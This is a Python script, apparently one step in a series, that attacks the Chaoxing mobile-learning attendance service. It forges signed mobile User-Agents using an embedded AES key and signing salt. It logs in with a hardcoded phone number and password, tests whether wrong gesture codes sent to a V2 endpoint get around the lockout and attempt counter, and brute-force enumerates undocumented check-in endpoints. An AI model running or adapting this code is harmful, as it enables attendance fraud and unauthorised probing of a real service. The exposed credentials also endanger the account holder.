#!/usr/bin/env python3
"""手势签到 Step5: V2 API与备用端点测试 — 是否绕过锁定/计数器"""
import base64, hashlib, json, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
BASE = "https://mobilelearn.chaoxing.com"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

AJAX_HDR = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
print(f"学生puid={puid_s}")

AID_LOCKED = "5000173244790"   # 已锁定
AID_C = "5000173244649"        # 未动过 — V2测试

# ============ 1. 已锁定活动上测V2 API（锁定是否全局） ============
print("\n[1] 已锁定活动上的V2 API /v2/apis/sign/signIn:")
r = s_s.get(f"{BASE}/v2/apis/sign/signIn",
            params={"activeId": AID_LOCKED, "uid": puid_s, "latitude": "-1", "longitude": "-1",
                    "signCode": "987654321"}, timeout=20)
print(f"  HTTP {r.status_code}: {r.text[:250]}")

# ============ 2. 未锁定活动上V2 API错误码 — 是否计入计数器 ============
print(f"\n[2] 活动{AID_C}上V2 API错误手势测试:")
for i in range(3):
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn",
                params={"activeId": AID_C, "uid": puid_s, "latitude": "-1", "longitude": "-1",
                        "signCode": "999888777"}, timeout=20)
    print(f"  尝试{i+1}: HTTP {r.status_code}: {r.text[:200]}")
    time.sleep(0.5)

# 检查活动C是否被V2错误尝试影响（checkSignCode计数器）
AJAX_HDR2 = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}
r = s_s.get(f"{BASE}/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": AID_C, "signCode": "777888999"}, headers=AJAX_HDR2, timeout=15)
try:
    print(f"  [checkSignCode对照] HTTP {r.status_code}: {json.dumps(r.json(), ensure_ascii=False)[:150]}")
except:
    print(f"  [checkSignCode对照] HTTP {r.status_code}: {r.text[:150]}")

# ============ 3. 枚举pcStuSignController其他方法 ============
print(f"\n[3] 枚举pcStuSignController兄弟端点:")
paths = ["sign", "stuSign", "checkSign", "signCode", "checkCode", "verifySignCode",
         "checkSignCodeV2", "preSign", "doSign", "submitSign"]
for p in paths:
    url = f"{BASE}/widget/sign/pcStuSignController/{p}"
    try:
        r = s_s.get(url, params={"activeId": AID_C, "signCode": "111222", "uid": puid_s},
                    headers=AJAX_HDR, timeout=10)
        if r.status_code != 404 and r.status_code != 500:
            print(f"  GET /{p}: HTTP {r.status_code}: {r.text[:150]}")
        r = s_s.post(url, data={"activeId": AID_C, "signCode": "111222", "uid": puid_s},
                     headers=AJAX_HDR, timeout=10)
        if r.status_code != 404 and r.status_code != 500:
            print(f"  POST /{p}: HTTP {r.status_code}: {r.text[:150]}")
    except Exception as e:
        pass

# ============ 4. POST形式的checkSignCode（data body，非param） ============
print(f"\n[4] POST body形式checkSignCode（活动C）:")
r = s_s.post(f"{BASE}/widget/sign/pcStuSignController/checkSignCode",
             data={"activeId": AID_C, "signCode": "555666777"},
             headers={**AJAX_HDR, "Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
try:
    print(f"  HTTP {r.status_code}: {json.dumps(r.json(), ensure_ascii=False)[:150]}")
except:
    print(f"  HTTP {r.status_code}: {r.text[:150]}")
